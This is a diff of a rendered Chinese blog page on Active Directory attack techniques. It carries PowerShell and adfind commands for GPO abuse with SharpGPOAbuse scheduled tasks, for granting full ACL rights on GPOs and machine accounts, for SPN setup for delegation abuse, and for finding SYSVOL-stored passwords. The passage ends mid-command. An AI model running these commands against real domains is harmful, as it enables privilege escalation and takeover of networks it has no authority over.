@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.92.0" /><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.883a355335df5c9f19d469cd25bb68215497fd354fb3a8699eaf851799c161a8.js"></script>
+        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>
 
     
 
@@ -350,27 +350,27 @@
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#加载GroupPolicy模块 （win7没有，win10有）</span>
-<span class="nb">Import-Module</span> <span class="n">GroupPolicy</span> <span class="err">–</span><span class="n">verbose</span>
-<span class="c">#获得所有GPO的内容</span>
-<span class="nb">Get-GPO</span> <span class="n">-All</span>
-<span class="c">#将所有GPO导出为一个HTML报告</span>
-<span class="nb">Get-GPOReport</span> <span class="n">-All</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GposReport</span><span class="p">\</span><span class="n">GposReport</span><span class="p">.</span><span class="n">html</span>
-<span class="c">#将每个GPO单独导出一个HTML报告</span>
-<span class="nb">Get-GPO</span> <span class="n">-All</span> <span class="p">|</span> <span class="p">%{</span>
-<span class="nb">Get-GPOReport</span> <span class="n">-name</span> <span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-path</span> <span class="p">(</span><span class="s2">&#34;c:\GPOReports\&#34;</span><span class="p">+</span><span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span><span class="p">+</span><span class="s2">&#34;.html&#34;</span><span class="p">)</span>
-<span class="p">}</span>
-<span class="c">#查看指定GPO的权限设置</span>
-<span class="nb">Get-GPPermission</span> <span class="n">-Name</span> <span class="s2">&#34;客服部组策略&#34;</span> <span class="n">-All</span> 
-<span class="c">#备份指定GPO</span>
-<span class="nb">Backup-Gpo</span> <span class="n">-Name</span> <span class="n">TestGPO1</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GpoBackups</span>
-<span class="c">#备份所有GPO</span>
-<span class="nb">Backup-Gpo</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\GpoBackups&#34;</span>
-<span class="c">#还原指定GPO</span>
-<span class="nb">Restore-GPO</span> <span class="n">-Name</span> <span class="n">TestGPO1</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GpoBackups</span>
-<span class="c">#还原所有GPO</span>
-<span class="nb">Restore-GPO</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\GpoBackups&#34;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#加载GroupPolicy模块 （win7没有，win10有）</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">GroupPolicy</span> <span class="err">–</span><span class="n">verbose</span>
+</span></span><span class="line"><span class="cl"><span class="c">#获得所有GPO的内容</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-GPO</span> <span class="n">-All</span>
+</span></span><span class="line"><span class="cl"><span class="c">#将所有GPO导出为一个HTML报告</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-GPOReport</span> <span class="n">-All</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GposReport</span><span class="p">\</span><span class="n">GposReport</span><span class="p">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl"><span class="c">#将每个GPO单独导出一个HTML报告</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-GPO</span> <span class="n">-All</span> <span class="p">|</span> <span class="p">%{</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-GPOReport</span> <span class="n">-name</span> <span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-path</span> <span class="p">(</span><span class="s2">&#34;c:\GPOReports\&#34;</span><span class="p">+</span><span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span><span class="p">+</span><span class="s2">&#34;.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c">#查看指定GPO的权限设置</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-GPPermission</span> <span class="n">-Name</span> <span class="s2">&#34;客服部组策略&#34;</span> <span class="n">-All</span> 
+</span></span><span class="line"><span class="cl"><span class="c">#备份指定GPO</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Backup-Gpo</span> <span class="n">-Name</span> <span class="n">TestGPO1</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GpoBackups</span>
+</span></span><span class="line"><span class="cl"><span class="c">#备份所有GPO</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Backup-Gpo</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\GpoBackups&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c">#还原指定GPO</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Restore-GPO</span> <span class="n">-Name</span> <span class="n">TestGPO1</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GpoBackups</span>
+</span></span><span class="line"><span class="cl"><span class="c">#还原所有GPO</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Restore-GPO</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\GpoBackups&#34;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="利用sysvol还原组策略中的密码"><a href="#利用sysvol还原组策略中的密码" class="anchor-link">#</a><a href="#contents:利用sysvol还原组策略中的密码" class="headings">利用SYSVOL还原组策略中的密码</a></h3>
 <p>如果在组策略中输入了密码，如以用户身份运行程序、修改域内主机内置administrator用户密码等操作。</p>
@@ -381,8 +381,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\Windows\SYSVOL\domain\Policies\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">C:\Windows\SYSVOL\domain\Policies\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><ol>
 <li>
@@ -414,15 +414,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#加载GroupPolicy模块 （win7没有，win10有）</span>
-<span class="nb">Import-Module</span> <span class="n">GroupPolicy</span>
-<span class="c">#创建一个GPO并将GPO链接到域0day.org，需要域管权限。</span>
-<span class="nb">new-gpo</span> <span class="n">-name</span> <span class="n">TestGPO2</span> <span class="p">|</span> <span class="nb">new-gplink</span> <span class="n">-Target</span> <span class="s2">&#34;dc=0day,dc=org&#34;</span>
-<span class="c">#添加定时任务 --TargetDnsName指定计算机</span>
-<span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddComputerTask</span> <span class="p">-</span><span class="n">-TaskName</span> <span class="s2">&#34;Update2&#34;</span> <span class="p">-</span><span class="n">-Author</span> <span class="n">DOMAIN</span><span class="p">\\</span><span class="n">Admin</span> <span class="p">-</span><span class="n">-Command</span> <span class="s2">&#34;cmd.exe&#34;</span> <span class="p">-</span><span class="n">-Arguments</span> <span class="s2">&#34;/c calc.exe&#34;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&#34;TestGPO2&#34;</span> <span class="p">-</span><span class="n">-FilterEnabled</span> <span class="p">-</span><span class="n">-TargetDnsName</span> <span class="nb">PC-jack</span><span class="p">-</span><span class="n">0day</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
-<span class="c">#删除GPO</span>
-<span class="nb">Remove-GPO</span> <span class="n">-Name</span> <span class="n">TestGPO2</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#加载GroupPolicy模块 （win7没有，win10有）</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">GroupPolicy</span>
+</span></span><span class="line"><span class="cl"><span class="c">#创建一个GPO并将GPO链接到域0day.org，需要域管权限。</span>
+</span></span><span class="line"><span class="cl"><span class="nb">new-gpo</span> <span class="n">-name</span> <span class="n">TestGPO2</span> <span class="p">|</span> <span class="nb">new-gplink</span> <span class="n">-Target</span> <span class="s2">&#34;dc=0day,dc=org&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c">#添加定时任务 --TargetDnsName指定计算机</span>
+</span></span><span class="line"><span class="cl"><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddComputerTask</span> <span class="p">-</span><span class="n">-TaskName</span> <span class="s2">&#34;Update2&#34;</span> <span class="p">-</span><span class="n">-Author</span> <span class="n">DOMAIN</span><span class="p">\\</span><span class="n">Admin</span> <span class="p">-</span><span class="n">-Command</span> <span class="s2">&#34;cmd.exe&#34;</span> <span class="p">-</span><span class="n">-Arguments</span> <span class="s2">&#34;/c calc.exe&#34;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&#34;TestGPO2&#34;</span> <span class="p">-</span><span class="n">-FilterEnabled</span> <span class="p">-</span><span class="n">-TargetDnsName</span> <span class="nb">PC-jack</span><span class="p">-</span><span class="n">0day</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
+</span></span><span class="line"><span class="cl"><span class="c">#删除GPO</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Remove-GPO</span> <span class="n">-Name</span> <span class="n">TestGPO2</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -459,12 +459,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
-<span class="nv">$TargetObject</span> <span class="p">=</span> <span class="nv">$RawObject</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">()</span>
-<span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-ADObjectAccessControlEntry</span> <span class="n">-InheritanceType</span> <span class="n">All</span> <span class="n">-AccessControlType</span> <span class="n">Allow</span> <span class="n">-PrincipalIdentity</span> <span class="n">test1</span> <span class="n">-Right</span> <span class="n">AccessSystemSecurity</span><span class="p">,</span><span class="n">CreateChild</span><span class="p">,</span><span class="n">Delete</span><span class="p">,</span><span class="n">DeleteChild</span><span class="p">,</span><span class="n">DeleteTree</span><span class="p">,</span><span class="n">ExtendedRight</span><span class="p">,</span><span class="n">GenericAll</span><span class="p">,</span><span class="n">GenericExecute</span><span class="p">,</span><span class="n">GenericRead</span><span class="p">,</span><span class="n">GenericWrite</span><span class="p">,</span><span class="n">ListChildren</span><span class="p">,</span><span class="n">ListObject</span><span class="p">,</span><span class="n">ReadControl</span><span class="p">,</span><span class="n">ReadProperty</span><span class="p">,</span><span class="n">Self</span><span class="p">,</span><span class="n">Synchronize</span><span class="p">,</span><span class="n">WriteDacl</span><span class="p">,</span><span class="n">WriteOwner</span><span class="p">,</span><span class="n">WriteProperty</span>
-<span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
-<span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span> <span class="p">=</span> <span class="nv">$RawObject</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-ADObjectAccessControlEntry</span> <span class="n">-InheritanceType</span> <span class="n">All</span> <span class="n">-AccessControlType</span> <span class="n">Allow</span> <span class="n">-PrincipalIdentity</span> <span class="n">test1</span> <span class="n">-Right</span> <span class="n">AccessSystemSecurity</span><span class="p">,</span><span class="n">CreateChild</span><span class="p">,</span><span class="n">Delete</span><span class="p">,</span><span class="n">DeleteChild</span><span class="p">,</span><span class="n">DeleteTree</span><span class="p">,</span><span class="n">ExtendedRight</span><span class="p">,</span><span class="n">GenericAll</span><span class="p">,</span><span class="n">GenericExecute</span><span class="p">,</span><span class="n">GenericRead</span><span class="p">,</span><span class="n">GenericWrite</span><span class="p">,</span><span class="n">ListChildren</span><span class="p">,</span><span class="n">ListObject</span><span class="p">,</span><span class="n">ReadControl</span><span class="p">,</span><span class="n">ReadProperty</span><span class="p">,</span><span class="n">Self</span><span class="p">,</span><span class="n">Synchronize</span><span class="p">,</span><span class="n">WriteDacl</span><span class="p">,</span><span class="n">WriteOwner</span><span class="p">,</span><span class="n">WriteProperty</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -478,12 +478,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
-<span class="nv">$TargetObject</span> <span class="p">=</span> <span class="nv">$RawObject</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">()</span>
-<span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-ADObjectAccessControlEntry</span> <span class="n">-InheritanceType</span> <span class="n">All</span> <span class="n">-AccessControlType</span> <span class="n">Allow</span> <span class="n">-PrincipalIdentity</span> <span class="n">test1</span> <span class="n">-Right</span> <span class="n">AccessSystemSecurity</span><span class="p">,</span><span class="n">CreateChild</span><span class="p">,</span><span class="n">Delete</span><span class="p">,</span><span class="n">DeleteChild</span><span class="p">,</span><span class="n">DeleteTree</span><span class="p">,</span><span class="n">ExtendedRight</span><span class="p">,</span><span class="n">GenericAll</span><span class="p">,</span><span class="n">GenericExecute</span><span class="p">,</span><span class="n">GenericRead</span><span class="p">,</span><span class="n">GenericWrite</span><span class="p">,</span><span class="n">ListChildren</span><span class="p">,</span><span class="n">ListObject</span><span class="p">,</span><span class="n">ReadControl</span><span class="p">,</span><span class="n">ReadProperty</span><span class="p">,</span><span class="n">Self</span><span class="p">,</span><span class="n">Synchronize</span><span class="p">,</span><span class="n">WriteDacl</span><span class="p">,</span><span class="n">WriteOwner</span><span class="p">,</span><span class="n">WriteProperty</span>
-<span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">RemoveAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
-<span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span> <span class="p">=</span> <span class="nv">$RawObject</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-ADObjectAccessControlEntry</span> <span class="n">-InheritanceType</span> <span class="n">All</span> <span class="n">-AccessControlType</span> <span class="n">Allow</span> <span class="n">-PrincipalIdentity</span> <span class="n">test1</span> <span class="n">-Right</span> <span class="n">AccessSystemSecurity</span><span class="p">,</span><span class="n">CreateChild</span><span class="p">,</span><span class="n">Delete</span><span class="p">,</span><span class="n">DeleteChild</span><span class="p">,</span><span class="n">DeleteTree</span><span class="p">,</span><span class="n">ExtendedRight</span><span class="p">,</span><span class="n">GenericAll</span><span class="p">,</span><span class="n">GenericExecute</span><span class="p">,</span><span class="n">GenericRead</span><span class="p">,</span><span class="n">GenericWrite</span><span class="p">,</span><span class="n">ListChildren</span><span class="p">,</span><span class="n">ListObject</span><span class="p">,</span><span class="n">ReadControl</span><span class="p">,</span><span class="n">ReadProperty</span><span class="p">,</span><span class="n">Self</span><span class="p">,</span><span class="n">Synchronize</span><span class="p">,</span><span class="n">WriteDacl</span><span class="p">,</span><span class="n">WriteOwner</span><span class="p">,</span><span class="n">WriteProperty</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">RemoveAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$TargetObject</span><span class="p">.</span><span class="n">PsBase</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 </ol>
@@ -505,14 +505,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#查找对gPCFileSysPath属性WriteProperty权限的用户</span>
-<span class="n">adfind</span> <span class="n">-b</span> <span class="n">CN</span><span class="p">=</span><span class="n">Policies</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">nTSecurityDescriptor</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">subtree</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPCFileSysPath</span><span class="p">;;</span> <span class="n">-recmute</span>
-
-<span class="c">#修改GPT的权限，由于GPT 是文件夹的形式，并不在LDAP里面，因此使用icacls查看。</span>
-<span class="n">icacls</span> <span class="p">\\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">sysvol</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">scripts</span><span class="p">*</span>
-<span class="n">icacls</span> <span class="p">\\</span><span class="n">test</span><span class="p">.</span><span class="n">localsysvol</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">policies</span><span class="p">*</span>
-<span class="c">#对目录有修改权限的可以随意修改组策略配置</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查找对gPCFileSysPath属性WriteProperty权限的用户</span>
+</span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">CN</span><span class="p">=</span><span class="n">Policies</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">nTSecurityDescriptor</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">subtree</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPCFileSysPath</span><span class="p">;;</span> <span class="n">-recmute</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#修改GPT的权限，由于GPT 是文件夹的形式，并不在LDAP里面，因此使用icacls查看。</span>
+</span></span><span class="line"><span class="cl"><span class="n">icacls</span> <span class="p">\\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">sysvol</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">scripts</span><span class="p">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">icacls</span> <span class="p">\\</span><span class="n">test</span><span class="p">.</span><span class="n">localsysvol</span><span class="p">\</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">policies</span><span class="p">*</span>
+</span></span><span class="line"><span class="cl"><span class="c">#对目录有修改权限的可以随意修改组策略配置</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -525,10 +525,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#遍历服部这个OU,对gLink或者gPOpptions有WriteProperty权限的用户</span>
-<span class="n">adfind</span> <span class="n">-b</span> <span class="n">OU</span><span class="p">=</span><span class="n">客服部</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">base</span>  <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPlink</span><span class="p">;;</span>
-<span class="n">adfind</span> <span class="n">-b</span> <span class="n">OU</span><span class="p">=</span><span class="n">客服部</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">base</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPOpptions</span><span class="p">;;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#遍历服部这个OU,对gLink或者gPOpptions有WriteProperty权限的用户</span>
+</span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">OU</span><span class="p">=</span><span class="n">客服部</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">base</span>  <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPlink</span><span class="p">;;</span>
+</span></span><span class="line"><span class="cl"><span class="n">adfind</span> <span class="n">-b</span> <span class="n">OU</span><span class="p">=</span><span class="n">客服部</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">0day</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">org</span> <span class="n">-sddl</span><span class="p">+++</span> <span class="n">-s</span> <span class="n">base</span> <span class="n">-sdna</span> <span class="n">-sddlfilter</span> <span class="p">;;;</span><span class="n">gPOpptions</span><span class="p">;;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 </ol>
@@ -577,21 +577,21 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#获取PC-MICLE-KIT的objectguid</span>
-<span class="nb">Get-DomainComputer</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span>
-
-<span class="c">#配置jack对PC-MICLE-KIT机器账号的所有权限，（必须配置，不然是无法修改账户属性的）</span>
-<span class="nb">Add-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="s1">&#39;b6283bcb-c141-4a53-99dd-a8d8a50a7b8d&#39;</span> <span class="n">-PrincipalIdentity</span> <span class="n">jack</span> <span class="n">-Rights</span> <span class="n">All</span> <span class="n">-Verbose</span>
-
-<span class="c">#如果利用的是普通域用户的话，获得域用户控制权限后还需要为域用户设置spn，机器用户就跳过这步。</span>
-<span class="n">setspn</span> <span class="n">-a</span> <span class="n">test</span><span class="p">/</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="n">test</span>
-
-<span class="c">#验证权限，jack的sid</span>
-<span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;S-1-5-21-3759881954-2993291187-3577547808-1135&#34;</span><span class="p">}</span>
-
-<span class="c">#删除权限</span>
-<span class="nb">Remove-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="s2">&#34;b6283bcb-c141-4a53-99dd-a8d8a50a7b8d&#34;</span> <span class="n">-PrincipalIdentity</span> <span class="n">jack</span> <span class="n">-Rights</span> <span class="n">all</span> <span class="n">-Verbose</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#获取PC-MICLE-KIT的objectguid</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#配置jack对PC-MICLE-KIT机器账号的所有权限，（必须配置，不然是无法修改账户属性的）</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Add-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="s1">&#39;b6283bcb-c141-4a53-99dd-a8d8a50a7b8d&#39;</span> <span class="n">-PrincipalIdentity</span> <span class="n">jack</span> <span class="n">-Rights</span> <span class="n">All</span> <span class="n">-Verbose</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#如果利用的是普通域用户的话，获得域用户控制权限后还需要为域用户设置spn，机器用户就跳过这步。</span>
+</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-a</span> <span class="n">test</span><span class="p">/</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="n">test</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#验证权限，jack的sid</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;S-1-5-21-3759881954-2993291187-3577547808-1135&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#删除权限</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Remove-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="s2">&#34;b6283bcb-c141-4a53-99dd-a8d8a50a7b8d&#34;</span> <span class="n">-PrincipalIdentity</span> <span class="n">jack</span> <span class="n">-Rights</span> <span class="n">all</span> <span class="n">-Verbose</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -612,19 +612,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#方法一 PowerView</span>
-<span class="c">#查看PC-MICLE-KIT机器账号的委派设置情况</span>
-<span class="nb">Get-DomainObject</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="nb">msds-allowedtodelegateto</span> <span class="p">|</span><span class="nb">fl
